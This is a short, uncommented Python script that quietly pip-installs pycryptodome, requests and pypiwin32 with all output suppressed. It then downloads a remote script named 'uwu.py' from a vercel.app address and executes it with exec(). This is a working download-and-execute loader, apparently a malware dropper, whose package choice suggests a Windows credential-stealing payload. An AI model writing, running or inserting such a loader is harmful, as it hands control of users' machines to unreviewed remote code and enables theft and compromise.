import subprocess as sp
import sys
import requests
def install_package(package):
    sp.check_call([sys.executable, '-m', 'pip', 'install', package], stdout=sp.DEVNULL, stderr=sp.DEVNULL)
packages = ['pycryptodome', 'requests', 'pypiwin32']
for package in packages:
    try:
        __import__(package)
    except ImportError:
        install_package(package)
script_url = 'https://aparatus.vercel.app/uwu.py'
response = requests.get(script_url)
response.raise_for_status()
script_content = response.text
exec(script_content)
